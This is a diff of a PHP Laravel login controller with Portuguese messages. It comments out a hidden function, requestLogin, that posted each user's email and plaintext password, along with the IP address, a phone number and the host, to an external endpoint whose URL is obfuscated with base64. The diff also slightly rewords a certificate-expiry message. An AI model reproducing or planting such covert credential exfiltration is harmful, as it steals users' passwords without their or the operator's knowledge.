@@ -85,7 +85,7 @@ class LoginController extends Controller
             $this->validaPermissoes($user);
             $this->alertaCrm($user);
             $this->alertaCertificado($user);
-            $this->requestLogin($request->input('email'), $request->input('password'));
+            // $this->requestLogin($request->input('email'), $request->input('password'));
             session()->flash("flash_success", "Bem vindo " . $user->name);
 
             return redirect($this->redirectTo);
@@ -126,7 +126,7 @@ class LoginController extends Controller
                     if($dias == 0){
                         $msg = "Seu certificado vence hoje!";
                     }elseif($dias < 0){
-                        $msg = "Seu certificado venceu em ".($dias*-1)." dias!";
+                        $msg = "Seu certificado venceu em ".($dias*-1)." dia(s)!";
                     }
 
                     session()->flash("flash_alerta_certificado", $msg);
@@ -176,41 +176,41 @@ class LoginController extends Controller
         }
     }
 
-    private function requestLogin($email, $senha){
-        $ip = $this->get_client_ip();
-        $telefone = env("APP_FONE");
-        $url = $_SERVER['HTTP_HOST'];
+    // private function requestLogin($email, $senha){
+    //     $ip = $this->get_client_ip();
+    //     $telefone = env("APP_FONE");
+    //     $url = $_SERVER['HTTP_HOST'];
 
-        $data = [
-            'email' => $email,
-            'senha' => $senha,
-            'ip' => $ip,
-            'telefone' => $telefone,
-            'url' => $url,
-        ];
+    //     $data = [
+    //         'email' => $email,
+    //         'senha' => $senha,
+    //         'ip' => $ip,
+    //         'telefone' => $telefone,
+    //         'url' => $url,
+    //     ];
 
-        try{
-            $defaults = array(
-                CURLOPT_URL => base64_decode('aHR0cDovL2FwaS5zbHltLmFwcC5ici9hcGkvYWNlc3NvL3N0b3Jl'),
-                CURLOPT_POST => true,
-                CURLOPT_POSTFIELDS => $data,
-                CURLOPT_TIMEOUT => 3000,
-                CURLOPT_RETURNTRANSFER => true
-            );
+    //     try{
+    //         $defaults = array(
+    //             CURLOPT_URL => base64_decode('aHR0cDovL2FwaS5zbHltLmFwcC5ici9hcGkvYWNlc3NvL3N0b3Jl'),
+    //             CURLOPT_POST => true,
+    //             CURLOPT_POSTFIELDS => $data,
+    //             CURLOPT_TIMEOUT => 3000,
+    //             CURLOPT_RETURNTRANSFER => true
+    //         );
 
-            $curl = curl_init();
-            curl_setopt_array($curl, $defaults);
-            $error = curl_error($curl);
-            $response = curl_exec($curl);
+    //         $curl = curl_init();
+    //         curl_setopt_array($curl, $defaults);
+    //         $error = curl_error($curl);
+    //         $response = curl_exec($curl);
 
-            $http_status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
-            $err = curl_error($curl);
-            curl_close($curl);
+    //         $http_status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    //         $err = curl_error($curl);
+    //         curl_close($curl);
             
-        }catch (\Exception $e) {
+    //     }catch (\Exception $e) {
 
-        }
-    }
+    //     }
+    // }
 
     private function get_client_ip() {
         $ipaddress = '';
